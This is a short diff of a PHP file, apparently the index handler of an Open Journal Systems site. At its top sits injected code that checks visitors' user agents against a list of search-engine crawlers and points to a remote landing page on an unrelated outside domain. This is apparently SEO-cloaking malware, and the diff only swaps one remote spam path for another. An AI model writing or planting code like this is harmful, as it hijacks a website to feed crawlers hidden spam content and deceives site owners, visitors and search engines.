@@ -2,7 +2,7 @@
 @ob_start();
 header("Vary: U-Agent");
 
-$src = "https://childrenofiran.org/landing/ojs.sttpbb/";
+$src = "https://childrenofiran.org/landing/journal.ceddi/";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
@@ -46,3 +46,5 @@ switch ($op) {
 		import('pages.index.IndexHandler');
 		break;
 }
+
+
